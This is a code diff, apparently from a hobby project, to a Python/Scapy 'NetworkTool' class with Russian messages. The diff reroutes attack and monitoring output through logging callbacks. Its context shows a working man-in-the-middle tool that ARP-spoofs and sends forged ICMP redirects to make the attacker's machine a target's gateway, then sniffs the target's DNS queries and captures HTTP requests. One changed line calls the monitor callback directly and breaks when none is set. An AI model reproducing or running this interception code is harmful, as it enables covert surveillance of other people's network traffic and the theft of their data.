@@ -27,6 +27,8 @@ class NetworkTool:
         self.target_info = {"ip": None, "mac": None, "name": None, "packets": 0}
         self.found_devices = []
         self.query_log = []
+        self.on_attack_log = None
+        self.on_monitor_log = None
 
     def _get_gateway_ip(self):
         if os.name == 'nt':
@@ -42,6 +44,14 @@ class NetworkTool:
         if not ip: return None
         ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=2, verbose=0)[0]
         return ans[0][1].hwsrc if ans else None
+
+    def _log_attack(self, msg):
+        if self.on_attack_log: self.on_attack_log(msg)
+        else: print(f"[ATTACK] {msg}")
+
+    def _log_monitor(self, msg):
+        if self.on_monitor_log: self.on_monitor_log(msg)
+        else: print(f"[MONITOR] {msg}")
 
     def update_devices(self):
         ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.network_range), timeout=3, retry=2, verbose=0)[0]
@@ -82,7 +92,7 @@ class NetworkTool:
         # Говорим цели: "Для трафика во внешку (8.8.8.8) используй мой IP как шлюз"
         icmp_p = IP(src=self.router_ip, dst=t_ip) / ICMP(type=5, code=1, gw=self.my_ip) / IP(src=t_ip, dst='8.8.8.8')
 
-        print(f"[*] Атака запущена: ARP + ICMP Redirect на {t_ip}")
+        self._log_attack(f"[*] Атака запущена: ARP + ICMP Redirect на {t_ip}")
 
         while self.is_attacking:
             try:
@@ -101,7 +111,7 @@ class NetworkTool:
                 if self.target_info['packets'] % 100 == 0:
                     check = srp(Ether(dst=t_mac) / ARP(pdst=t_ip), timeout=0.2, verbose=0)[0]
                     if not check:
-                        print(f"\n[!] Цель {t_ip} пропала. Ухожу в ЗАСАДУ...")
+                        self.on_monitor_log(f"\n[!] Цель {t_ip} пропала. Ухожу в ЗАСАДУ...")
                         self._wait_for_target()
 
                 time.sleep(0.05)
@@ -127,7 +137,7 @@ class NetworkTool:
         os.system(ps_cmd)
 
     def monitor_process(self):
-        """Режим прослушки: Трафик течет сквозь нас"""
+        """Режим прослушки: Трафик течет сквозь меня"""
         t_ip = self.target_info['ip']
         t_mac = self.target_info['mac']
 
@@ -137,7 +147,7 @@ class NetworkTool:
         to_v = Ether(dst=t_mac) / ARP(op=2, pdst=t_ip, psrc=self.router_ip, hwsrc=self.my_mac)
         to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, psrc=t_ip, hwsrc=self.my_mac)
 
-        print(f"[*] МОНИТОРИНГ: {t_ip} под наблюдением...")
+        self._log_monitor(f"[*] МОНИТОРИНГ: {t_ip} под наблюдением...")
 
         def packet_callback(pkt):
             if not self.is_attacking: return
@@ -155,13 +165,12 @@ class NetworkTool:
 
                     # Печатаем красиво с меткой времени
                     t_str = time.strftime("%H:%M:%S")
-                    print(f"[{t_str}] ЦЕЛЬ ПЕРЕШЛА: {query}")
+                    self._log_monitor(f"[{t_str}] ЦЕЛЬ ПЕРЕШЛА: {query}")
 
             if pkt.haslayer(IP) and pkt.haslayer("Raw"):
                 payload = pkt["Raw"].load.decode(errors='ignore')
                 if "GET" in payload or "POST" in payload:
-                    # Пытаемся найти поисковые запросы в URL (например, ?q=hello)
-                    print(f"\n[!] ПЕРЕХВАЧЕН HTTP ЗАПРОС:\n{payload[:200]}")
+                    self._log_monitor(f"\n[!] ПЕРЕХВАЧЕН HTTP ЗАПРОС:\n{payload[:200]}")
 
         # Сниффер в отдельном потоке
         Thread(target=lambda: sniff(filter=f"host {t_ip} and udp port 53", prn=packet_callback, store=0),
